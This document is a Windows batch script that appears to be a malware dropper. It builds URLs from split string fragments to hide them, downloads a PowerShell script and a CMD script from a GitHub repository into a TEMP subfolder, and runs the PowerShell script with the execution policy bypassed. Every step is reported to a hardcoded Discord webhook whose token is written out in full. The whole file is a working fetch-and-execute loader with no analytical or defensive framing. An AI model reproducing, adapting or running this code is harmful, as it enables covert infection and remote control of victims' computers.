@echo off
setlocal EnableDelayedExpansion

:: Obfuscate strings by splitting into individual characters or segments
set "h=https"
set "g=github"
set "c=com"
set "sl=/"
set "strPs1URL=%h%:%sl%%sl%%g%.%c%%sl%invisibleghostshell-ux%sl%last%sl%raw%sl%main%sl%setup.ps1"
set "strWinURL=%h%:%sl%%sl%%g%.%c%%sl%invisibleghostshell-ux%sl%last%sl%raw%sl%main%sl%win.cmd"
set "t=TEMP"
set "zz=\ZZ\"
set "strRootPath=!%t%!%zz%"

:: Construct paths with segments
set "s=setup.ps1"
set "w=win.cmd"
set "strPs1Path=%strRootPath%!s!"
set "strWinPath=%strRootPath%!w!"
set "intWait=5000"

:: Obfuscate Discord webhook URL
set "d=https://discord.com/api/webhooks"
set "id1=/1268854626288140372"
set "id2=/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
set "strWebhookURL=%d%%id1%%id2%"

:: Create root folder
if not exist "%strRootPath%" (
    mkdir "%strRootPath%"
    if exist "%strRootPath%" (
        call :SendToDiscord "Created root folder: !strRootPath!"
    ) else (
        call :SendToDiscord "Failed to create root folder: !strRootPath!"
    )
)

:: Download PowerShell script if it does not exist
call :SendToDiscord "Starting download of PowerShell script..."
if not exist "%strPs1Path%" (
    call :DownloadFile "!strPs1URL!" "!strPs1Path!"
)

:: Download CMD script if it does not exist
call :SendToDiscord "Starting download of CMD script..."
if not exist "%strWinPath%" (
    call :DownloadFile "!strWinURL!" "!strWinPath!"
)

call :SendToDiscord "Download completed. Waiting for 1 minute..."
timeout /t 60 /nobreak >nul

:: Execute the PowerShell script
if exist "%strPs1Path%" (
    call :SendToDiscord "Executing PowerShell script..."
    powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%strPs1Path%"
    call :SendToDiscord "Executed: !strPs1Path!"
)

exit /b

:DownloadFile
set "u=%~1"
set "l=%~2"
echo Downloading !u! to !l!...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('!u!', '!l!')"
if %errorlevel%==0 (
    call :SendToDiscord "Downloaded: !u!"
) else (
    call :SendToDiscord "Failed to download: !u!"
)
exit /b

:SendToDiscord
set "msg=%~1"
powershell -Command "$msg = '!msg!'; $webhook = '!strWebhookURL!'; $json = '{\"content\":\"' + $msg + '\"}'; $response = Invoke-WebRequest -Uri $webhook -Method Post -ContentType 'application/json' -Body $json;"
exit /b
